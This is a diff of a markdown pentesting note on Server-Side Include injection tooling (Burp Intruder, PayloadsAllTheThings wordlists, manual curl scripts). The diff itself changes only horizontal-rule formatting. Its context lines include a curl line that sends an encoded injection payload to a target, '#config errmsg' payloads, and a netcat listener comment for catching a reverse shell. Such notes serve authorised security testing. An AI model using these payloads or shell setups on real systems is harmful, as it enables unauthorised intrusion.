@@ -17,7 +17,7 @@ linked:
 ---
 # SSI - Tooling
 
-***
+---
 
 ## Burp Intruder + Active Scan
 
@@ -37,7 +37,7 @@ linked:
 | Settings → match patterns | Custom regex grep | Per-engagement. |
 ^ssi-tool-burp
 
-___
+---
 
 ## Wordlists (PayloadsAllTheThings + custom)
 
@@ -57,7 +57,7 @@ ___
 | `#config errmsg` payloads | Customize error format | Output control. |
 ^ssi-tool-wordlists
 
-___
+---
 
 ## Manual curl / Custom Scripts
 
@@ -112,4 +112,4 @@ curl -s "${TARGET}?${PARAM}=${ENCODED}"
 # Atacante: nc -lvnp 4444
 ```
 
-***
+---
